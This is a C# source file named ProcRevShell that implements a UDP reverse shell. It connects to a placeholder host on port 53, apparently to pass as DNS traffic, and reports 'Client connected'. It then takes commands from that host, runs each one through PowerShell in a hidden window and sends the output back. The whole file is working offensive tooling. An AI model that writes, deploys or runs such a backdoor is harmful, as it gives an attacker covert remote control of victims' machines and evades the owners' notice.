using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;


namespace ProcRevShell
{
	public class Program
	{

		public static void Main(string[] args)
		{
			UdpClient udpClient = new UdpClient(11000);
			reto:	

			try{
				udpClient.Connect ("IP", 53);

				Byte[] sendBytes = Encoding.ASCII.GetBytes("Client connected !\n");

				udpClient.Send(sendBytes, sendBytes.Length);

				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

				while(true){
					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
					string returnData = Encoding.ASCII.GetString(receiveBytes);

					/*Console.WriteLine("Received command from " + RemoteIpEndPoint.Address.ToString());*/

					ProcessStartInfo processInfo;
					Process process;
					
					processInfo = new ProcessStartInfo ("Powershell", "/c " + returnData.ToString());
					processInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processInfo.CreateNoWindow = true;
					processInfo.UseShellExecute = false;
					processInfo.RedirectStandardError = true;
					processInfo.RedirectStandardOutput = true;

					process = Process.Start(processInfo);
					processInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processInfo.CreateNoWindow = true;
					processInfo.UseShellExecute = false;
					processInfo.RedirectStandardError = true;
					processInfo.RedirectStandardOutput = true;

					string output = process.StandardOutput.ReadToEnd();
					string error = process.StandardError.ReadToEnd();
					int exitCode = process.ExitCode;

					Console.WriteLine(output);

					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);

					udpClient.Send(outputtobytes, outputtobytes.Length);
				goto reto;
				}
				
				udpClient.Close();

			}
			catch (Exception e ) {
				Console.WriteLine(e.ToString());
			}

		}

	}
}
